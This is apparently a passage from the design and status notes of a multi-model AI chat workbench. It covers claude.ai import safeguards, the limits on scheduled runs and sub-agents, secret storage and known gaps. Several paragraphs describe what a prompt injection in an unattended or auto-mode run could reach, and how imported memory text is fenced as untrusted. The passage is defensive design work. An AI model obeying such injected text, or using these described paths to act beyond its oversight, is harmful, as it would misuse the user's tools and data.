`Sec-Fetch-Mode: navigate`: a form, a page load, a plugin such as a PDF
viewer), even from the server's own origin: OtherBench's UI only writes with
fetch, and PDFs are served from that origin unsandboxed. Not the Referer:
`/view/` pages send none. Reads aren't checked, since CORS already
stops another site reading them. It runs in every mode, behind the Host
check, so the desktop's token is no longer the only defence.

**Importing from claude.ai reads a folder the client names** (spec
2026-10-09-claude-import-design). `POST /api/import/claude` and its preview
take an absolute folder path, as a chat's workspace does, behind the same
token, Host and cross-site checks as every other write. Only files whose
names match the export's parts are read (`conversations.json`,
`projects/*.json`, `memories/*.json`, `artifacts/<id>/...`), from files or
from ZIPs named as the export's are (`conversations-000.zip` and the like;
any other ZIP in the folder is left alone). Every path is checked with
`containPath`, so a link is only followed when it leads somewhere inside
the folder, a file over 512 MiB or a ZIP of 2 GiB is refused, and the parts
read may add up to 2 GiB and 50,000 at most. ZIPs are read in memory by a small reader
(`packages/server/src/import/zip.ts`) that refuses ZIP64, encryption and
anything but stored or deflated entries, never inflates past an entry's
stated size and checks every CRC. Entry names are only compared, never used
as paths, so a hostile archive can't write anywhere. The reading runs in a
worker thread (`claude-reader-worker.js`, beside `cli.js` in the desktop
app's bundled server, as `render-worker.js` is), which is stopped when the
read ends or the request goes away. What the import writes
goes under `<db>.imported/claude/` through `containPath`, with names made
safe by `safeFileName`. The export's content is treated as untrusted:
claude.ai's memory notes are fenced as `<claude-notes>` in the condensing
prompts with the summariser's rules (no instructions, commands or URLs
copied in). The learned note and project notes are checked the same way as
a summariser update before they are saved, and both reach chats fenced as
untrusted background. About you can't be fenced (it is the user's own
words, which the model follows), so the import only drafts it: the user
reads it in the report and saves it, or doesn't. Cowork is read from the
folder Claude Desktop keeps on this machine (or `OTHERBENCH_COWORK_ROOT`) and
from the folder chosen for the import, the same one the export is read
from; the search under it is capped at five folders deep and 2,000 folders,
session and transcript ids that could make a path are refused, every path
goes through `containPath`, and transcripts are capped at 512 MiB each and
2 GiB for each folder read.

**Scheduled runs act with nobody watching.** What still runs unattended is
exactly what needs no card: existing Always grants (exact host-shell commands
included), the sites on the profile's browser site list, read-only tools and read-only MCP tools under "Ask on changes",
artifacts, web tools a profile allows and sandboxed commands (under "Ask on
changes"; a host off the sandbox's list is refused, never asked, unless a host grant already covers it). A prompt
injection in a scheduled run is limited to those, and a sandboxed command can
still push data to a host on the allowlist (see the sandbox's known limits). The editor's warnings list what will be refused, not what will run.
There's no spend cap; usage rows are written as normal.

A schedule on a Claude Code profile can opt in to auto mode ("Use auto mode",
`Schedule.autoMode`, off by default). Its runs then go further: Claude Code's
classifier decides every Claude Code call that would have needed a card, and
OtherBench's own tools (relayed MCP, sandboxed commands, the browser, recall)
are approved as in a chat with Auto on, whatever the profile's approval mode.
Nobody sees what the classifier allows, and the classifier isn't a security
boundary, so a prompt injection in such a run (an issue's text, a web page)
reaches whatever the profile has enabled. The editor says so next to the
checkbox. Computer use, a generation that would need its ask, a sandbox host
off the list, and anything Claude Code still asks about (`canUseTool`) stay
refused.

**Sub-agents never widen what a reply can do.** A sub-agent's tools are what both its parent's policy and its chosen profile's policy allow (never wider than either), every one of its tool calls goes through the same broker, cards, grants and audit as the parent's, and it can't start another sub-agent or make artifacts. Its shell is never wider than the parent's: a sandboxed parent's sub-agent runs in the sandbox, reaching only the hosts on both allowlists, and a host-shell parent's sub-agent gets the host shell only as a host-shell profile, and no shell at all as a sandboxed one (a sandboxed command needs no card, and the parent's commands all do). It works under the parent reply's plan gate and unattended flag, so in Plan mode its changes are refused until the user approves the parent's plan, and in a scheduled run a call that needs a card is refused. Grants are matched and stored under the parent reply's own profile, not the profile the sub-agent runs as, so a careful parent (always ask, no grants) can't borrow another profile's grants by running a sub-agent as it. Its answer is model-written text the parent reads like any other tool result, so text it read (a web page, a file) can reach the parent's context the same way a tool result always could.

## Encryption at rest

Provider API keys and other secrets live in `secrets.json` next to the
database (`<dirname(dbPath)>/secrets.json`), AES-256-GCM encrypted, key
derived via scrypt. The passphrase itself is either `OTHERBENCH_SECRETS_PASSPHRASE`
if you set it (`otherbench serve` reads it and deletes it from its
environment, so no process it starts inherits it), or — the default — a random 256-bit value generated once and
persisted at `secrets.json.key`, right beside the ciphertext it unlocks
(mode `0600` on POSIX; a documented no-op on Windows, where the file ends up
world-readable-equivalent). Stated plainly, from `container.ts`'s own
comment: **this protects against casual disclosure and backup/copy leakage
where the key file gets left behind by accident — it is not a defense
against local filesystem access.** Anyone who can read the encrypted file
can read the key file sitting next to it and decrypt everything. No OS
keychain integration exists (`Windows cmdkey` can set a credential but the
OS won't hand the password back out via CLI, so a keychain-backed store
couldn't round-trip reliably; macOS/Linux keychains were never built either)
— the encrypted-file store is the only option, and it warns loudly about
this on startup.

## Known gaps

- **The web store's message pool is pruned by chat, but only on a switch.**
  `messages` is still one pool across chats, scoped at the point of use
  (`chatMessages` in `Thread.tsx`). On a chat switch or pane change
  (`packages/web/src/state/messagePool.ts`) the store forgets the messages of
  chats not in use, past the `KEPT_RECENT_CHATS` (8) viewed last, along with
  their extras, recorded usage, background tasks and queued notes. In use
  means shown in a pane of either mode (pinned or not, a viewer tab's chat
  included), followed by a thread (`useChatSync`, so quick chat counts),
  replying, with a card open, or with notes queued. Replying and open cards
  are read from the app-wide events (`appRunningTurns`,
  `appPendingApprovals`), not from the pool: a closed chat's messages stop
  updating, so a reply left mid-stream would otherwise look like it runs for
  ever. A forgotten chat loads again when it next shows, since `useChatSync`
  fetches on every open. Not pruned: events buffered for messages not yet
  known (`pendingEvents`, replayed by `loadMessages`), `chatReloads` counters,
  and `VariantTabs`' small per-message caches. Each undocked window prunes
  its own store.
- **`list_dir` holds no verifiable handle.** Covered above under TOCTOU —
  repeating it here because it's the sharpest instance of "narrowed, not
  closed": Node has no fd-based `readdir`, so this one is structural, not a
  matter of writing a tighter check.
- **Inspector and MCP health are pushed, not polled.** The Inspector's MCP
  servers, Tool grants and Audit trail sections, and Settings > MCP servers,
  no longer poll every 4 s. The server announces changes on the app-wide
  `GET /api/events` stream, with no new connection: `mcp-changed`
  (`serverId`, or null for any) from `McpServerManager.onChange` (a client's
  status or tool list, a client torn down, a sign-in started, cancelled or
  finished, and every `sync()`, which the routes call after each write);
  `grants-changed` (`chatId`, null for an "always" grant) and
  `audit-changed` (`chatId`) from the store's grant and audit repos being
  wrapped like the chat repo (`withStoreEvents`), so the broker's grants, a
  used-up "once" grant and Revoke are all covered. The payloads carry ids
  only; the web re-reads the section (`useLiveData`), 200 ms after the last
  of a burst but at most 1 s after its first, and re-reads all three on
  every `hello`, so a change missed
  while the stream was down still shows. There is no safety poll: every
  change comes from this process. Revoke still removes its row at once. The
  audit trail's "Ns ago" times are redrawn every 10 s without a fetch. What
  is left: a pending MCP sign-in that runs out of time ends with no event,
  so Settings > MCP servers still checks once a second while one is pending
  (`McpSignIn.tsx`). `/api/events` isn't on the peer listener, so none of
  these three events reaches a paired machine as it is. Instead, for a chat
  that runs on another machine, the Inspector's Tool grants, MCP servers and
  Audit trail show that machine's (Adam's call, 2026-11-07): the
  chat-scoped routes are forwarded there over the peer listener, and that
  machine announces `tool-state` (section and chat id only) on
  `/peer/events`, which arrives as `peer-tool-state` (see *v2: machines and
  sync*). Over the peer listener a paired machine can read these three for
  a chat that runs on the machine it asks, revoke one of that chat's grants
  and reconnect an MCP server already set up there; it can't add, edit,
  enable or sign in an MCP server.
- **An accepted upload is held in memory, not streamed to disk.** The 25MB
  cap now holds while the body is read (see Attachments above), so an
  oversized upload is refused about a megabyte past the cap. An upload
  under the cap is still parsed whole in memory by `parseBody()` and then
  copied into a `Buffer` before it's written, so one upload can briefly
  hold about twice its size (at most around 52MB). Writing parts to disk as
  they arrive would need a streaming multipart parser, which Node and Hono
  don't provide.
- **Abandoned unsent attachments are kept for 30 days, and a few never go.**
  The sweep (see Attachments above) deletes an unsent attachment 30 days
  after its row last changed, so a file abandoned in a chat holds its disk
  space for that long. It never touches a row last written by another
  machine either. Unsent attachments don't sync, so today no such row can
  be unsent; if one ever is (a synced message deleted on its own, which
  sets `message_id` to null and leaves the row), it stays until its chat is
  deleted.
- **Blobs in the legacy shared `attachments/` directory are never
  garbage-collected.** `BlobStore`'s `legacyRoot` is read-only by design (see
  Attachments above) — the sweep only ever touches the per-database write
  root, so anything left over from before the per-database fix sits there
  permanently, servable but never reclaimed.
- **`:memory:` databases' temp attachments roots are cleaned up on shutdown
  now, but older ones from before that fix may still be sitting in `%TEMP%`.**
  `createContainer`'s `close()` now removes a `:memory:` run's own
  `otherbench-attachments-*` temp directory (`container.ts`), but that fix is
  itself recent — `blob-store.ts`'s own comment notes 28 such directories
  were found already accumulated on this machine before it landed. Safe to
  delete by hand; nothing references them once their server process exits.
- **A paired machine is trusted with what syncs.** It can change any
  synced row: rename chats, delete profiles (and so their chats), re-point
  a connection whose key it already has, add sites to a profile's browser
  site list (which this machine's browser then uses without asking; never a
  local or private address, which the broker and the proxy refuse whatever
  the list says). It can't read or overwrite this
  machine's other secrets, switch on sharing of a key kept here, re-point a
  kept-here connection, or name a blob outside the store (all refused, with
  tests). Pairing is between your own machines; treat a paired machine as
  you would your own account on it.
- **Changes from another machine arrive by sync, a whole list at a time.**
  A machine checks for its own changes every 0.5 s and announces them on
  the peer stream; the other pulls at once, and each sync reloads the chat
  list, projects, profiles, connections and apps whole (and open chats
  their messages), so a change shows within about a second, but by
  re-reading lists, not row by row. Running replies, cards waiting, background
  tasks and computer-use sessions on the other machine are live (its
  `activity`, see *Live state between machines*), and so is the other
  machine's list of schedules, read-only (its `schedules` announcement, see
  *Scheduled tasks*). Apart from that, what doesn't sync never shows:
  grants, MCP servers, the audit log, settings.
- **The laptop isn't told when the PC declines its start.** A remote
  start is accepted at the PC by design (its dialog asks, naming the
  laptop; see *Computer use across machines*). The start route answers 202
  at once and the laptop learns of the session from the PC's activity; a
  Cancel there, or the dialog closing unanswered after 110 s, is only in
  the PC's log, so the laptop just never sees a session. Not tried on two
  real machines.
- **Project memory is summarised only by the machine a chat runs on**, so
  two machines don't redo and overwrite each other's notes. Its version
  history stays on the machine that wrote it.
- **Chats are only filed under projects with claude.ai's chat list.** The
  export doesn't record which project a conversation was in; without the
  saved list every imported chat lands in No project.
- **Cowork's own outputs aren't imported.** A session's `outputs/` folder
  (files it wrote) stays where it is, and images inside tool results become
  notes.
- **Importing again with memory ticked folds claude.ai's notes in again.**
  The learned note and the project notes take whatever the model makes of
  the notes a second time. Untick the box for a re-run.
- **A re-import leaves out claude.ai messages it can't place.** A new
  message whose parent isn't in the chat, whose id is already another
  chat's, or that would sit beside one of the chat's own messages of the
  other role is skipped with everything under it; the preview and the
  report give the count per chat. When claude.ai's messages go in as a
  branch beside the user's, memory summarises them only if the user
  switches to that branch.
- **An imported project's docs folder does nothing until there is a
  workspace.** Extra folders only apply to a chat with a workspace folder
  (spec 2026-10-07-extra-folders), and imported projects have none, so the
  report says so for each docs folder.
- **Reading an export costs more time and memory than it did, and planning
  it still runs on the main thread.** The ZIPs are inflated and the JSON
  parsed in a worker (`import/claude-reader-worker.ts`), which sends the
  conversations back in batches of about a megabyte, so the longest pause
  for other requests on a 53 MB synthetic export went from 0.2 to 0.3 of a
  second to about 10 ms. Copying the result back makes the read itself
  about 0.15 s slower, and the parsed export is held twice, in the worker
  and the main thread, until the worker is stopped. `planClaudeImport` and
  the preview's checks against the database still run on the main thread
  after the read; the checks of chats already here yield every 50 chats.
- **Remote access, phase 1** (spec 2026-10-12-remote-access): no passkeys.
  iOS and Android trust of the hand-made CA is checked only on real devices.
  **Web Push and the phone layout have not run on a real phone.** Not
  checked by hand yet: delivery through Apple's, Google's and Mozilla's push
  services (a browser only subscribes over https with a certificate it
  trusts, so the CA must be installed and trusted first); on iOS 16.4+,
  adding OtherBench to the Home Screen, opening it from there, allowing
  notifications and getting a push with the app closed (the manifest's icon
  is the SVG favicon, which iOS may not use for the Home Screen: a PNG
  `apple-touch-icon` is still to make); a tap opening the right chat both
  with OtherBench open and closed; Android Chrome showing the
  notification; and the layout on a real 390 px screen (safe areas, the
  keyboard over the composer). Nothing is pushed for a chat on a paired
  machine. A device that sets "Notify this device" and then has its site
  data cleared keeps its row until the push service answers 410. The
  presence report is per session, not per tab, so one hidden tab on a
  device can clear "showing" while another tab still shows. Phone layout:
  Code mode, the Code panel overlay, the Inspector overlay and the viewer
  were not reworked for 390 px (they open, at the narrow-window layout);
  the Overview's rows and the chat header's buttons are smaller than 44 px.
  Sessions now survive a restart and Settings lists the
  signed-in devices (see *Sessions* under Remote access), but the list shows
  the address a device signed in from, not the one it was last seen at, and
  signing one device out doesn't forget its remembered-device cookie (that
  cookie opens nothing by itself). Renewed `--tls-cert`/`--tls-key` files
  are loaded while running; the sign-in limits still reset on a restart.
- **MCP sign-in, phase 2** (Deck #931). Not built: registering the public and loopback redirect addresses side by side (each change of address registers again), revoking tokens at the provider on sign-out (RFC 7009), a fixed callback port for providers that pin it, a sign-in button in the Inspector, and URL-based client IDs (SEP-991). In open or token mode with `--host ::1` or one specific non-loopback address, `127.0.0.1` isn't served, so the callback can't arrive; paste-back still works. Tool-call error text from an MCP server isn't redacted (only lifecycle errors are). After a URL change and a new sign-in, a stale refresh on the old URL can force one more sign-in; it never discloses a token.
- **The model's browser** (Deck #926). It runs on the host with Chromium's own sandbox only; a later phase moves it into the sandbox VM. The proxy doesn't enforce per-site grants (see the section above). Chromium may still resolve names itself for prefetching (a hostname leak to DNS, not a connection). Another LAN device's global IPv6 address outside this machine's own /64s is treated as the internet. Sign-in, cookie import, screenshots to the model, site categories and tabs are phase 2. In a scheduled run a site needs an Always grant made beforehand, or to be on the profile's site list. That list is checked without a Public Suffix List, so a wildcard over a suffix outside its rules (`*.k12.ca.us`) is accepted, and a real site that happens to look like a registry (a two-label name such as `co.xx`) is refused as a wildcard base. Sub-agents share the chat's one browser.
- **Computer use** (Deck #927). Ships switched off and none of its desktop side has run; a Claude Code helper's screenshots aren't stored or shown (the turn's own are). Scheduled runs, Plan mode and sub-agents never get it (see `docs/integration.md`). The full list is under *Computer use* above.
- **Dependency advisories** -- cleared: `npm audit --omit=dev` reports 0 after upgrading to the latest v6 line (`ai@6.0.300`, `@ai-sdk/provider-utils@4.0.57` -> `undici@6.29.0`), `hono@4.13.12` and a plain `npm audit fix` for the MCP SDK's transitive deps. `ai` stays pinned to v6; never `npm audit fix --force`.
- **Office files (Deck #928): the writers' output has been opened in real
  Office, but not end to end through a model.** On 2026-11-09 a memo, a
  two-sheet budget and a five-slide deck made by the shipped writers
  (`renderOfficeFileInProcess`, not through a chat) were opened over COM in
  Excel, Word and PowerPoint 16 (Excel build 20527). No repair prompt in any.
  Excel calculated all 22 formulas on the budget's second sheet, a reference
  into `'Monthly Costs'` included, with no `#NAME?`: XLOOKUP, XMATCH, FILTER,
  SORT, TEXTJOIN and all ten prefixes set from memory (VALUETOTEXT,
  ARRAYTOTEXT, PERCENTOF, TRIMRANGE, REGEXTEST, REGEXEXTRACT, REGEXREPLACE,
  ENCODEURL, DBCS) are right. Every cached value written (SUM, IF with `<`,
  `&` and doubled quotes, AVERAGE, ROUND, COUNT on a whole column, text `&` a
  number, `=0.1+0.2`) equalled Excel's own, and in Protected View (before
  Enable Editing) those showed and the uncached ones were blank. That check
  found that SORT, FILTER, UNIQUE and SEQUENCE opened as `@SORT(...)` and so
  on, one value and no spill; every formula is now written as a dynamic-array
  formula (`xl/metadata.xml`, see `server/src/office/xlsx.ts`), and the four
  spill in Excel. Word: Heading 1/2 are Word's own styles, the numbered and
  bulleted lists are List Paragraph, the 3x3 table is a real table. Raw HTML
  in the markdown (`<text>`) is left out, as the preview leaves it out.
  PowerPoint: 5 slides at 960x540 (16:9), slide numbers on all but the
  title, notes kept, the table slide a real 3x2 table.
  The spreadsheet asks Excel to calculate on open (`fullCalcOnLoad`), and a
  downloaded file opens in Protected View, where Excel doesn't recalculate, as
  do viewers that don't calculate (Outlook, Explorer or Finder preview panes,
  phone viewers, Drive previews). Those show a formula's cached value, which
  `server/src/office/formula-values.ts` writes for a subset (`<v>`, with
  `t="b"` for TRUE/FALSE and `t="str"` for text):
  - Cached: number, text and TRUE/FALSE literals; `+ - * / ^ %`, unary `+`
    and `-`, `&`, `= <> < <= > >=`; references to cells, ranges, whole
    columns and rows, on the same or another sheet, `$` or not, quoted or
    non-ASCII sheet names; dates in cells (as their serial numbers); SUM,
    AVERAGE, MIN, MAX, COUNT, COUNTA, IF, AND, OR, NOT, ROUND, ROUNDUP,
    ROUNDDOWN and ABS, with Excel's rules for empty cells, text and TRUE/FALSE
    in a reference against typed arguments, and IF working out only the
    branch it takes. Numbers are written with 15 significant digits, as Excel
    shows them, so `=0.1+0.2` is written 0.3.
  - Still not cached (as before, the cell shows empty or 0 until Excel
    calculates): every other function (VLOOKUP, XLOOKUP, TEXT, LEN, DATE and
    so on), array constants, the intersection operator, and anything that
    uses them; results that are errors (#DIV/0!, #VALUE!, #N/A); circular
    references and anything that depends on one, a branch IF doesn't take
    included; text in arithmetic (`="3"+1`, which Excel converts by locale);
    ordering text that isn't plain letters and digits, and comparing non-ASCII
    text that isn't identical; numbers that compare, round or turn into text
    differently at full precision and at 15 digits (`=0.1+0.2=0.3`,
    `ROUNDUP(0.1+0.2,1)`), numbers below 0.001 or from 10^15 in `&`, and sums
    that cancel to almost nothing (`=0.5-0.4-0.1`, which Excel may show as
    0); text with spaces at its ends or a line break. A workbook that uses
    OFFSET, or `:` next to a function (`A1:INDEX(...)`), gets no cached values
    at all, as its references can't be known from the text, and so does one
    whose dependencies come to more than two million; past ten million cells
    read while calculating, the formulas still to do are left uncached.
  - The rules follow Microsoft's documentation and Excel's known behaviour.
    Only the cases listed above have been checked against Excel itself; they
    matched.

  Still to do by hand, once: ask a Claude Code profile and an API profile for a
  one-page memo, a budget with a formula on a second sheet that refers to the
  first, and a five-slide deck; download each and open it.
  - Excel: before Enable Editing, and in a preview pane, the cached formulas
    (the budget's SUM and cross-sheet reference) should show their values and
    the rest may look empty or 0; then click Enable Editing. No repair prompt; formulas show values, not `#NAME?` or `#REF!`,
    including newer functions (XLOOKUP, FILTER, SORT and the ten whose
    `_xlfn.` prefix was set from memory, not Microsoft's list: XMATCH,
    VALUETOTEXT, ARRAYTOTEXT, PERCENTOF, TRIMRANGE, REGEXTEST, REGEXEXTRACT,
    REGEXREPLACE, ENCODEURL, DBCS); a cross-sheet reference; an unquoted
    non-ASCII sheet name (`Données!A1`). Still unchecked: Excel 2016/2019,
    which show the formulas as one-cell array formulas (`{=...}`).
  - Word: Heading 1/2 are Word's own styles; numbered lists restart; tables
    and links look right.
  - PowerPoint: 16:9; slide numbers (none on title slides); notes; a table of
    at the 30-row cap (`MAX_TABLE_ROWS`; the layout sets no row height, so
    it may run off the slide); section slide colours.
  - Attach a real Word file, Excel workbook (with dates and formulas) and
    deck on each profile and ask questions only their contents answer.
  - Known limits meanwhile: no charts or images in made files, no templates,
    no .doc/.xls/.ppt or OpenDocument, no previews of Office files already
    in the workspace, no argument-count check on formulas (`=ROUND(1)` is
    accepted and may make Excel complain), and a hostile uploaded file can
    hold the upload request for about 10-15 seconds (up to 64 MB of parts at
    4-6 MB/s). The upload cap doesn't shorten this: the time goes on
    unpacking a file that is already within 25MB.
  - Word fidelity gaps: an ordered list's start number is ignored; a
    reference-style link loses its URL; lists, tables and headings inside a
    blockquote lose the quote styling; link targets with spaces aren't
    percent-encoded; the preview loads remote images through `MarkdownBody`
    while the .docx writes `[Image: alt]`.
- **Live artifacts in the desktop window are unchecked.** The probe
  (`packages/web/e2e/live-probe.spec.ts`) covers Chromium only; run its
  checks by hand in WebView2. Phase 2: forward live calls to the chat's *Runs
  on* machine, a bundled chart library, free-text and date parameters, and the iframe `csp`
  attribute (CSP Embedded Enforcement) in Chromium and WebView2 so a document
  that replaces a live page has to take the live policy too. Phase 3: WebView2
  `FrameNavigationStarting` to stop a live page leaving. Until then the
  navigation guard only notices navigations that commit: a 204 or 205 answer
  (or a download) leaves the page open, and a document that replaces the page
  before its first load is answered as the page while the view is open.
- **Live grants are bound to the MCP server id.** A grant now needs the
  tool's name and its server's id to match. A renamed or replaced server
  needs a fresh OK. Live grants made before this change have no server id,
  so they need approving again; there is no backfill.
- **Live artifacts by hand:** a dashboard from the real Nextcloud server
  (`tasks_list`, `cal_list` with `from: 'today'`, `to: '+7d'`) written from
  the guidance alone; an `update` that leaves the calls alone keeps the
  approval and one that changes args asks for that call only; a Claude Code
  chat making one with relayed tool names; viewing from the paired laptop.
- **Scheduled tasks phase 2 is partly built.** Every-N-hours and cron rules, browser notifications for scheduled runs and the schedule count in the chat and project delete dialogs are done (see "Scheduled tasks"). A paired machine's schedules now show in the overlay, read-only, while it is reachable. Still missing: schedules don't sync or move between machines and can only be run, changed or deleted on the machine that holds them (there is no route for that on the peer listener, deliberately), a schedule's run history (the History list) isn't shown for another machine's, there are no phone notifications and no attachments in the prompt. A cron rule has no `L`, `W`, `#` or seconds, and a schedule's zone can't be changed. Deleting a profile still removes its schedules without a mention, and the e2e spec doesn't cover the new rule kinds.
- **Slash commands.** Claude Code's own automatic compaction draws no line in
  the thread. A chat's own commands appear in the `/` menu only after its first
  reply since the server started; listing them any other way would run the
  folder's SessionStart hooks.
- **Sub-agents share the chat's one browser page** (see the browser section).
  A browser per sub-agent would need `BrowserManager` keyed on more than the
  chat.

## Where to look

| Document | What it is |
| --- | --- |
| `README.md` | Install, run, add a connection/profile via the Settings UI (or curl), the mock-provider walkthrough |
| Collectives `Products/OtherBench/Design/Specs/2026-08-12-grunt-multi-model-chat-workbench-design` | The original design spec — architecture, data model, permission model, error taxonomy |
| Collectives `Products/OtherBench/Design/Plans/2026-08-12-grunt-v1` | The 31-task implementation plan this was originally built from, with the full milestone breakdown and code-level detail for M0–M3 |
| `packages/core/src/domain/paths.ts`, `packages/tools/src/fs-tools.ts` | The containment/TOCTOU/hard-link mechanics and their residuals, documented in-module — read these directly rather than trusting a paraphrase, this one included |
| `packages/store-sqlite/src/blob-store.ts`, `packages/store-sqlite/src/blob-gc.ts` | The per-database attachment roots, the legacy-root fallback, and the GC sweep — same rule: read the module comments directly |
| `docs/integration.md` | How the Cowork-parity branches were merged (October 2026), the migration renumbering, how computer use meets the rest |
| `docs/deviations.md` | Where the build differs from the specs and plans, and why |
| `docs/testing.md` | How the test setup behaves (test typechecking, source resolution, the drive-letter case, time limits) |

## If you're picking this back up

What is left is on the Deck board `OtherBench` (Backlog and To Do), with
`d1107` listing what still needs a hand check in the running app. The open
gaps are under Known gaps above. Re-run `npm audit --omit=dev` now and
then; `ai` stays on v6 until the v7 migration is looked at on its own.
